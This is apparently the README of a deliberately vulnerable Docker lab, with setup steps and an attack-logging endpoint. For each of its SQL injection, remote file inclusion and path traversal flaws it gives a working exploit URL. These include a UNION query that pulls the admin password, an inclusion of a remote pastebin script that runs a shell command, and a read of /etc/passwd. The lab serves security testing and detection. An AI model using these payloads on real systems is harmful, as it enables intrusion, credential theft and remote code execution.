# Alpha and Beta app #

Before you run alpha and beta app, please install docker and docker-compose.

### How to run Alpha and Beta app? ###

* Clone this repository
* Run `sudo docker-compose build`
* Run `sudo docker-compose up`
* Run `sudo docker-compose exec beta bash`
* Inside bash shell of beta app, run:

  ```
  /app# flask db upgrade
  /app# exit
  ```
  
Note: <br>
a. IP <b>172.17.0.1</b> is Docker IP. Please adjust with your own Docker IP.<br>
b. It need port 65412 for alpha, 10000 for beta and 3306 for MySQL. Please free-up those ports on your machine.


### Endpoint Alpha ###

* Vulnerable SQL Injection

  [http://172.17.0.1:65412/?id=2](http://172.17.0.1:65412/?id=2)
  
  How to exploit : 

  [http://172.17.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)](http://172.17.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27))

* Vulnerable Remote File Inclusion

  [http://172.17.0.1:65412/?include=](http://172.17.0.1:65412/?include=)

  How to exploit :

  [http://172.17.0.1:65412/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&cmd=ifconfig](http://172.17.0.1:65412/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&cmd=ifconfig)

* Vulnerable Path Traversal

  [http://172.17.0.1:65412/?path=](http://172.17.0.1:65412/?path=)

  How to exploit :

  [http://172.17.0.1:65412/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd](http://172.17.0.1:65412/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd)

  
### Endpoint Beta ###

  To get list of attacks activity:

  [http://172.17.0.1:10000/attacks](http://172.17.0.1:10000/attacks)
